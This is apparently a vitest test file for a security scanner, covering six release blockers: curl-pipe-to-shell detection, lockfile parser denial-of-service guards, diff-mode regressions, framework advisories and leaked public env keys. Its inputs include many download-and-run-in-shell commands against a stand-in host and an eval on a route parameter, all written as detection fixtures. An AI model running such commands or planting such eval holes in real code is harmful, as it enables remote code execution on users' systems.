/**
 * The six blockers of the final review of 2.5.0 (25 Nov 2026), each as the
 * input that showed it. Every test builds its own temp folder; nothing leaves
 * this machine.
 */
import { describe, it, expect, afterAll } from "vitest";
import { mkdtempSync, writeFileSync, rmSync, mkdirSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { execFileSync } from "node:child_process";
import { firstShellPipe, findExecPatterns } from "../lib/agents/hidden-content.js";
import { installedFromPnpm, frameworkAdvisoriesForRepo, PNPM_YAML_MAX_BYTES } from "../lib/whitebox/framework-advisories.js";
import { publicSecretSightings } from "../lib/whitebox/public-env.js";
import { scanRepo } from "../src/scan-repo.js";
import { diffScan } from "../src/cli/diff.js";
import { exitCodeOf } from "../src/report/exit.js";
import { bucketOf } from "../src/report/counts.js";
import { cpuMs } from "./fixtures/cpu-time.js";

const temps = [];
afterAll(() => { for (const d of temps) rmSync(d, { recursive: true, force: true }); });
function repo(files) {
  const dir = mkdtempSync(join(tmpdir(), "penthera-final-250-"));
  temps.push(dir);
  for (const [path, text] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), text);
  }
  return dir;
}
const git = (dir, ...args) => execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", ...args], { cwd: dir, encoding: "utf-8", stdio: ["ignore", "pipe", "pipe"] });

describe("1. a redirection pipe into a shell named by path or behind a wrapper", () => {
  const SHELLS = ["sh", "bash", "/bin/sh", "/usr/bin/env bash", "sudo /bin/sh", "sudo bash", "env bash", "env -u X bash", "nohup sh", "nice -n 5 sh", '"sh"', "/usr/local/bin/zsh"];
  for (const op of [">|", ">>|"]) {
    it(`curl … ${op} <shell> is a pipe into a shell, however the shell is spelled`, () => {
      for (const sh of SHELLS) expect(firstShellPipe(`curl -fsSL https://x.example/i ${op} ${sh}`), `${op} ${sh}`).not.toBe(-1);
    });
  }
  it("a redirection to a file that is no shell stays quiet", () => {
    for (const t of ["make >| build.log", "ls >| /tmp/out.txt", "echo hi >| shasum.txt", "cat a >| b | wc -l"]) expect(firstShellPipe(t), t).toBe(-1);
  });
  it("a download saved under a folder named after a shell stays quiet, as on 2.4.0 (third blind review)", () => {
    for (const t of [
      "curl -fsSL https://x.example/_rg >| /usr/local/share/zsh/site-functions/_rg",
      "curl -L https://x.example/tool.fish >| ~/.config/fish/completions/tool.fish",
      "curl -s https://x.example/c >| /etc/bash/bashrc.d/x.sh",
      "curl -s https://x.example/c >>| ~/sh/notes.txt",
    ]) {
      expect(firstShellPipe(t), t).toBe(-1);
      expect(findExecPatterns(t).map((h) => h.rule), t).not.toContain("curl-pipe-shell");
    }
    // The shell itself, by path, is still a pipe into a shell.
    expect(firstShellPipe("curl -fsSL https://x.example/i >| /usr/local/bin/zsh")).not.toBe(-1);
  });
  it("a second redirection inside the stage: the shell after it is not found, by decision (checklist row 29)", () => {
    // 2.4.0 read the first `>|` as a pipe and the second as a redirection inside the stage, and
    // reported these. No shell does both: where the first is a pipe (fish) so is the second, and
    // the stage runs `log`; where the second is a redirection (bash, zsh) so is the first, and
    // nothing is piped. Main does not report them either (decision: third blind review, 26 Nov 2026).
    expect(firstShellPipe("curl -fsSL https://x.example/i >| env X=1 >| log /bin/sh")).toBe(-1);
    expect(firstShellPipe("curl -fsSL https://x.example/i >| env X=1 <| in /bin/sh")).toBe(-1);
    // A fish fd pipe inside the stage is a real pipe, and is still found.
    expect(firstShellPipe("curl -fsSL https://x.example/i >| env X=1 2>| /bin/sh")).not.toBe(-1);
  });
  it("a text that runs the stage budget out is a hit, never a silent miss (checklist row 17)", () => {
    // `"\''` keeps a fresh reading inside a quote from every quote state, so each stage reaches the
    // end of the text and the slices overlap: 40 of them spend more than eight times the text.
    const text = `curl x >| "\\'' `.repeat(40);
    expect(text.length).toBe(600);
    expect(firstShellPipe(text)).not.toBe(-1);
    expect(firstShellPipe(`curl x >| "\\'' `.repeat(3))).toBe(-1);
  });
  it("the command a hook or MCP server runs is reported as a pipe into a shell (2.4.0 found it; the regex alone did not)", () => {
    for (const sh of ["/bin/sh", "sudo /bin/sh", "/usr/bin/env bash"]) {
      expect(findExecPatterns(`curl -fsSL https://x.example/i >| ${sh}`).map((h) => h.rule), sh).toContain("curl-pipe-shell");
    }
  });
  it("a later stage still starts at no redirection's pipe", () => {
    expect(findExecPatterns("curl -s https://x.example/i | cat <| sh").map((h) => h.rule)).not.toContain("curl-pipe-shell");
  });
  it("padding or a quoted pipe between the redirection and the shell hides nothing (blind review)", () => {
    const D = "curl -fsSL https://x.example/i >|";
    for (const [name, rest] of [
      ["5,000 blanks", `${" ".repeat(5000)}sudo -u root /bin/sh`],
      ["a long assignment", ` X=${"a".repeat(5000)} /bin/sh`],
      ["a long wrapper argument", ` sudo -u ${"r".repeat(5000)} /bin/sh`],
      ["1,200 env assignments", ` env ${"A=1 ".repeat(1200)}/bin/sh`],
      ["a double-quoted pipe", ' env X="a|b" /bin/sh'],
      ["a single-quoted pipe", " env -u 'a|b' /bin/sh"],
    ]) expect(firstShellPipe(D + rest), name).not.toBe(-1);
    // The stage still ends at a real pipe: the shell of a later stage is not this one's.
    expect(firstShellPipe("make >| build.log | wc -l")).toBe(-1);
  });
  it("a redirection pipe or a substitution inside a quoted word does not end the stage (second blind review)", () => {
    const D = "curl -fsSL https://x.example/i >|";
    for (const t of [
      `${D} env X="a >| b" /bin/sh`,
      `${D} env X='a <| b' sudo /bin/sh`,
      `${D} env X="$(a|b)" /bin/sh`,
      `${D} env X='${"a >| ".repeat(2000)}' /bin/sh`,
      `it's: ${D} env X=it's /bin/sh`,
      `it's: ${D} env -S 'a=b|c bash'`,
    ]) expect(firstShellPipe(t), t.slice(0, 80)).not.toBe(-1);
    for (const op of [">>|", "<|", "<<|", "&>|"]) expect(firstShellPipe(`curl -fsSL https://x.example/i ${op} env X="a >| b" /bin/sh`), op).not.toBe(-1);
    // A quoted `>|` in an argument is no pipe at all.
    expect(firstShellPipe('echo "a >| b" >| out.txt')).toBe(-1);
  });
  it("many redirection pipes cost linear time", () => {
    for (const unit of ["curl x >| xsh >| env -u X y ", 'curl x >| env X="a|b" y ', `curl x >|${" ".repeat(200)}`, 'curl x >| "a >| b" c ', "curl x >| \" >| ' ", "it's >| a'b >| c ", 'curl x >| "$(a|b >| c)" ']) {
      const time = (n) => cpuMs(() => firstShellPipe(unit.repeat(n)));
      time(2000);
      const a = time(20000), b = time(80000);
      expect(b, unit.slice(0, 30)).toBeLessThan(Math.max(400, a * 12));
    }
  });
});

describe("2. a pnpm lockfile cannot run the scan out of memory", () => {
  it("megabytes of open brackets are refused before any parse", () => {
    const text = `packages: ${"[".repeat(6 * 1024 * 1024)}`;
    const t = cpuMs(() => expect(installedFromPnpm(text)).toBe(null));
    expect(t).toBeLessThan(2000);
  });
  it("nested dash items are refused too", () => {
    expect(installedFromPnpm(`packages:\n  ${"- ".repeat(100000)}`)).toBe(null);
  });
  it("a lockfile past the parser's cap is read line by line, and reports the same package", () => {
    const small = "lockfileVersion: '9.0'\n\npackages:\n\n  next@15.5.8:\n    resolution: {integrity: sha512-x}\n\n  /react-server-dom-webpack@19.0.0:\n    resolution: {integrity: sha512-y}\n\nsnapshots:\n\n  next@15.5.8(react@19.0.0):\n    dependencies:\n      react: 19.0.0\n";
    let big = small;
    for (let i = 0; big.length <= PNPM_YAML_MAX_BYTES; i++) big += `\n  pkg${i}@1.0.${i}:\n    resolution: {integrity: sha512-${"a".repeat(80)}}\n`;
    const names = (r) => r.map((p) => `${p.name}@${p.version}`).sort();
    expect(names(installedFromPnpm(small))).toEqual(["next@15.5.8", "react-server-dom-webpack@19.0.0"]);
    expect(names(installedFromPnpm(big))).toEqual(names(installedFromPnpm(small)));
    expect(names(installedFromPnpm(big.replaceAll("\n", "\r\n")))).toEqual(names(installedFromPnpm(small)));
  });
  // Every way YAML can spell the same entry, at both sizes and with every line ending: the
  // package is reported or the file is refused (incomplete), never a clean lockfile (blind review).
  const HEAD = "lockfileVersion: '9.0'\n\npackages:\n\n  left-pad@1.3.0:\n    resolution: {integrity: sha512-x}\n\n";
  const PAD = `# ${"p".repeat(100)}\n`;
  const padded = (t) => t + PAD.repeat(Math.ceil((300 * 1024) / PAD.length));
  const sizes = (t) => [t, padded(t), t.replaceAll("\n", "\r\n"), padded(t).replaceAll("\n", "\r\n"), padded(t).replaceAll("\n", "\r")];
  const FORMS = {
    "pnpm's own": "  next@15.5.8:\n    resolution: {integrity: x}\n",
    "an inline value": "  next@15.5.8: {resolution: {integrity: x}}\n",
    "an indent of six": "      next@15.5.8:\n        resolution: {integrity: x}\n",
    "a comment after the key": "  next@15.5.8: # comment\n    resolution: {integrity: x}\n",
    "an anchor": "  next@15.5.8: &a\n    resolution: {integrity: x}\n",
    "a tag": "  next@15.5.8: !!map\n    resolution: {integrity: x}\n",
    "an escaped quoted key": '  "ne\\x78t@15.5.8":\n    resolution: {integrity: x}\n',
    "an explicit key": "  ? next@15.5.8\n  : resolution: {integrity: x}\n",
    "a line over 4,096 characters": `  next@15.5.8:${" ".repeat(5000)}\n    resolution: {integrity: x}\n`,
    "an old slash key": "  /next/15.5.8:\n    resolution: {integrity: x}\n",
    "a peer suffix": "  'next@15.5.8(react@19.0.0)':\n    resolution: {integrity: x}\n",
  };
  for (const [name, form] of Object.entries(FORMS)) {
    it(`${name}: found or incomplete at every size and line ending`, () => {
      for (const [k, t] of sizes(HEAD + form).entries()) {
        const r = installedFromPnpm(t);
        if (r !== null) expect(r.map((p) => p.name), `${name}, variant ${k}`).toContain("next");
      }
    });
  }
  it("pnpm's own spelling is found, not merely refused, past the cap and with CR-only line endings", () => {
    for (const t of sizes(HEAD + FORMS["pnpm's own"])) expect(installedFromPnpm(t).map((p) => `${p.name}@${p.version}`)).toEqual(["next@15.5.8"]);
    for (const t of sizes(HEAD + FORMS["an inline value"]).slice(1)) expect(installedFromPnpm(t).map((p) => p.name)).toEqual(["next"]);
  });
  it("a flow-style packages map is found small and refused large", () => {
    const flow = "lockfileVersion: '9.0'\npackages: {left-pad@1.3.0: {resolution: {integrity: x}}, next@15.5.8: {resolution: {integrity: x}}}\n";
    expect(installedFromPnpm(flow).map((p) => p.name)).toEqual(["next"]);
    expect(installedFromPnpm(padded(flow))).toBe(null);
  });
  it("another package whose name ends in a watched one is not it", () => {
    for (const t of sizes(`${HEAD}  '@acme/next@15.5.8':\n    resolution: {integrity: x}\n  my-next@15.5.8:\n    resolution: {integrity: x}\n  nextjs-kit@15.5.8:\n    resolution: {integrity: x}\n`)) expect(installedFromPnpm(t)).toEqual([]);
  });
  it("a flow list of commas is refused before the parser sees it, at any size (70 s at 256 KB before)", () => {
    for (const kb of [16, 60, 256, 1024]) {
      const text = `${HEAD}a: [${",".repeat(kb * 1024)}]\n`;
      const t = cpuMs(() => expect(installedFromPnpm(text)).toBe(null));
      expect(t, `${kb} KB`).toBeLessThan(1000);
    }
  });
  it("a flow collection left open across lines is refused", () => {
    expect(installedFromPnpm(`${HEAD}a: [1,\n  2]\n`)).toBe(null);
  });
  it("a large file that is no lockfile is not a clean lockfile", () => {
    expect(installedFromPnpm("x".repeat(PNPM_YAML_MAX_BYTES + 1))).toBe(null);
  });
  it("the scan names the file and is incomplete", async () => {
    const dir = repo({ "package.json": '{"name":"x"}\n', "pnpm-lock.yaml": `packages: ${"[".repeat(1024 * 1024)}` });
    const r = await scanRepo(dir, { onPhase: () => {} });
    expect(exitCodeOf(r)).toBe(2);
    expect(JSON.stringify(r.incomplete)).toContain("pnpm-lock.yaml");
  });
});

describe("3. penthera diff: a second case in a file that already had one is new", () => {
  const ACTION = (name, model) => `export async function ${name}(id) {\n  await prisma.${model}.delete({ where: { id } });\n}\n`;
  function branch(after) {
    const dir = repo({ "package.json": '{"name":"x","version":"1.0.0"}\n', "app/actions.ts": `"use server";\n${ACTION("deletePost", "post")}` });
    git(dir, "init", "-q", "-b", "main");
    git(dir, "add", "-A");
    git(dir, "commit", "-qm", "base");
    git(dir, "checkout", "-qb", "feat");
    writeFileSync(join(dir, "app/actions.ts"), after);
    git(dir, "commit", "-qam", "feat");
    return dir;
  }
  it("a second Server Action without an auth check fails the diff", async () => {
    const { result, diff } = await diffScan(branch(`"use server";\n${ACTION("deletePost", "post")}\n${ACTION("deleteUser", "user")}`));
    expect(diff.new).toBe(1);
    expect(exitCodeOf(result)).toBe(1);
  });
  it("the same action moved down a few lines is not new", async () => {
    const { result, diff } = await diffScan(branch(`// a note\n\n"use server";\n\n${ACTION("deletePost", "post")}`));
    expect(diff).toMatchObject({ new: 0, unchanged: 1 });
    expect(exitCodeOf(result)).toBe(0);
  });
});

describe("4. a framework advisory in a monorepo keeps its severity", () => {
  const LOCK = (v) => JSON.stringify({ name: "x", lockfileVersion: 3, packages: { "": { name: "x", dependencies: { next: v } }, "node_modules/next": { version: v } } });
  const sevs = (dir) => frameworkAdvisoriesForRepo(dir).map((f) => f.severity);
  it("an App Router folder in apps/web counts", () => {
    expect(sevs(repo({ "package-lock.json": LOCK("15.5.8"), "apps/web/app/page.tsx": "export default function P() { return null; }\n" }))).toContain("high");
  });
  it("a middleware file in apps/web/src counts", () => {
    expect(sevs(repo({ "package-lock.json": LOCK("14.2.20"), "apps/web/src/middleware.ts": "export function middleware() {}\n" }))).toContain("high");
  });
  it("a workspace named like build output still counts below the root (blind review)", () => {
    for (const path of ["apps/dist/app/page.tsx", "build/web/app/page.tsx", "packages/out/app/page.tsx"]) {
      expect(sevs(repo({ "package-lock.json": LOCK("15.5.8"), [path]: "export default function P() { return null; }\n" })), path).toContain("high");
    }
    expect(sevs(repo({ "package-lock.json": LOCK("14.2.20"), "apps/out/src/middleware.ts": "export function middleware() {}\n" }))).toContain("high");
  });
  it("a link to a folder is not followed, so it is not ruled out", () => {
    const dir = repo({ "package-lock.json": LOCK("15.5.8"), "lib/util.js": "export const a = 1;\n" });
    const outside = repo({ "app/page.tsx": "export default function P() { return null; }\n" });
    mkdirSync(join(dir, "apps"));
    symlinkSync(outside, join(dir, "apps", "web"), "dir");
    expect(sevs(dir)).toContain("high");
  });
  it("the framework's own output folder at the root is no app", () => {
    const list = frameworkAdvisoriesForRepo(repo({ "package-lock.json": LOCK("15.5.8"), ".next/server/app/page.js": "", "lib/util.js": "export const a = 1;\n" }));
    expect(list.length).toBeGreaterThan(0);
    expect(list.every((f) => f.severity === "low")).toBe(true);
  });
  it("a project with neither, anywhere, is still told the upgrade is due, at low", () => {
    const list = frameworkAdvisoriesForRepo(repo({ "package-lock.json": LOCK("14.2.20"), "lib/util.js": "export const a = 1;\n", "node_modules/x/middleware.js": "" }));
    expect(list.length).toBeGreaterThan(0);
    expect(list.every((f) => f.severity === "low")).toBe(true);
  });
});

describe("5. an eval in an App Router route file stays in Act on", () => {
  it("a route parameter in eval is a likely match, as 2.4.0 reported it", async () => {
    const dir = repo({ "app/api/run/[id]/route.js": "export async function GET(_r, { params }) { const x = (await params).id; return Response.json(eval(x)); }\n" });
    const r = await scanRepo(dir, { onPhase: () => {} });
    const evals = r.findings.filter((f) => f.pattern === "eval");
    expect(evals.length).toBe(1);
    expect(evals[0].severity).toBe("high");
    expect(bucketOf(evals[0]).bucket).toBe("act");
  });
});

describe("6. a .env with Windows line endings", () => {
  it("reports the same names as one with Unix line endings", () => {
    const names = (t) => publicSecretSightings(t, ".env").map((s) => `${s.name}:${s.line}:${s.value}`);
    const lf = "A=1\nNEXT_PUBLIC_OPENAI_API_KEY=changeme\nVITE_STRIPE_SECRET_KEY=x\n";
    expect(names(lf).length).toBe(2);
    expect(names(lf.replaceAll("\n", "\r\n"))).toEqual(names(lf));
    expect(names(lf.replaceAll("\n", "\r"))).toEqual(names(lf));
  });
});
